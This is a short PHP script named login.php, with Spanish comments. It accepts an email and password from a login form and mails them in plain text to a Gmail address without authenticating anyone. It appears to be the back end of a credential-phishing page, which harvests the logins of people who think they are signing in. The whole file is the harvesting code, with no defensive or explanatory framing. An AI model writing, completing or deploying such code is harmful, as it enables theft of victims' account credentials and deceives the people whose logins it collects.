<?php
// login.php

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    // Sanitizar los datos recibidos
    $email = htmlspecialchars($email);
    $password = htmlspecialchars($password);

    // Dirección de correo a la que se enviarán los datos
    $to = 'atleticoaxixic@gmail.com';
    $subject = 'Nuevo inicio de sesión';
    $message = "Correo electrónico: $email\nContraseña: $password";
    $headers = "From: noreply@tu-dominio.com\r\n" .
               "Reply-To: noreply@tu-dominio.com\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "Los datos se han enviado correctamente.";
    } else {
        echo "Error al enviar los datos.";
    }
}
?>
